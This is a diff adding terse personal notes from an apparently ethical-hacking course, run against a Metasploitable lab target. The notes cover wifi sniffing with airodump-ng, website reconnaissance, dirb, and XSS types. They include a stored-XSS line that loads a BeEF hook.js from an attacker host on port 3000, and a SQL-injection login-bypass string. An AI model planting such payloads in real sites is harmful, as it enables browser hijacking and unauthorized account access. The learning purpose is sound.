@@ -13,6 +13,66 @@ ifconfig wlan0 down - airmon-ng check kill (will loose internet connection as we
 
 chipset is the brains of adapter that does all the processing & calculations not the brand - atheros AR9271  then alfa & realtek  recommended
 
+sniffing -> airodump-ng <mon_dev>
+
+wifi bands are 2.4 & 5G    (5 GHz monitoring not widely supported)
+
+airodump-ng --band a <mon_dev>  # for 5G
+
+using metaexploitable as target and keeps security low
+
+info gathering -> ip dns technologies used(server,db,language) subdomains other webisites on same domain 
+
+whois.domaintools.com      to get ip and dns and hosting details
+toolbar.netcraft.com    to get technologies used
+robtex.com       comprehensive dns records
+
+exploit-db  containslist of latest exploits
+
+gaining access to one website is an entry if  multiple websites run on same server
+
+in bing type ip:<ip>  get multiple webs sharing ip
+
+there might be subdomains that are not advertised like for employees
+
+dirb - the tool to get hidden files in the directory when dir eq route (basically bruteforces with list of file names possibly
+present in the directory)
+
+xss - injecting js into page  
+3 types  1)stored/persistent in db  executes everytime you visit
+2)reflected   only while reaching a manipulated url
+3)DOM       interpreted and run on client   WS not involved
+
+reflected - he is trying to inject into text box or corresponding url GET    and types  <script>alert("XSS")</script>  then submit
+then such an url is sent to the target 
+
+stored/persistent - leverages the comment section and same code but runs on all clients loading the comments section
+
+beef framework to use stored hook XSS      starting beef  and then commenting   <script  src="ip:3000/hook.js"> </script>
+target shown as hooked in beef console   along with the multiple options that beef provions to be executed on the hooked
+
+select * from accounts where user='user_name' and password='12345' and 1=1 #'
+
+so basically need to inject whatever is the code needed in 1=1 section
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
 
 
 
